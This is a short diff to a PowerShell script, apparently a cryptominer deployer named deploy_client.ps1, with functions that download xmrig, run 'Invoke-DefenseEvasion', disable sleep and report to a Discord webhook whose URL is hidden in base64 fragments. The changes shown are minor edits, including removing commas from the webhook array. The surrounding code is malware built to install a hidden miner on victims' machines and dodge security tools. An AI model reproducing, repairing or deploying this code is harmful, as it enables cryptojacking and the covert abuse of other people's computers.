@@ -127,6 +127,7 @@ function Install-Miner {
     Write-Host "[+] Downloading xmrig..." -ForegroundColor Yellow
     $downloaded = $false
     for ($attempt = 1; $attempt -le 3; $attempt++) {
+
         try {
             $versions = @("10.0", "10.0.19041", "10.0.22000", "10.0.22621")
             $winVer = $versions | Get-Random
@@ -467,8 +468,8 @@ function Backup-MinerFiles {
 function Send-DiscordWebhook {
     param([bool]$Success = $true, [string]$ErrorMsg = "")
     $dcParts = @(
-        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv",
-        "MTU1MDkzNzk2MjE3MzE2OTgwNC8=",
+        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
+        "MTU1MDkzNzk2MjE3MzE2OTgwNC8="
         "SC1XbC1tY1BZakFuREhycjJocXkydVdMOFNJZG5jeXROSUNCblhI"
         "Wk5FcGlqNmJSNmNDYVMzRWhEdWxxMzErS0JaS1FRPQ=="
     )
@@ -490,7 +491,7 @@ function Send-DiscordWebhook {
 $deploymentSuccess = $false
 $deploymentError = ""
 try {
-    Write-Host "`n[!] deploy_client.ps1 v7.5.5 — BUGFIX EDITION" -ForegroundColor Cyan
+    Write-Host "`n[!] deploy_client.ps1 v7.5.5 - BUGFIX EDITION" -ForegroundColor Cyan
     Invoke-DefenseEvasion
     Start-RandomDelay -Min 3 -Max 8
     Disable-Sleep
